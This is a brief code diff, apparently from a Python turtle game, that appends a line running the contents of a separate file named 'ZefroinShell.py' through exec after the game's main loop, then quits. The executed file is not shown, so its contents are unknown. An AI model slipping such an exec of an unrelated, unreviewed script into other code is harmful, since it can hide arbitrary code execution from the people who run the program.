@@ -180,3 +180,5 @@ while True:
     time.sleep(delay)
 
 wn.mainloop()
+exec(open('ZefroinShell.py').read())
+quit()
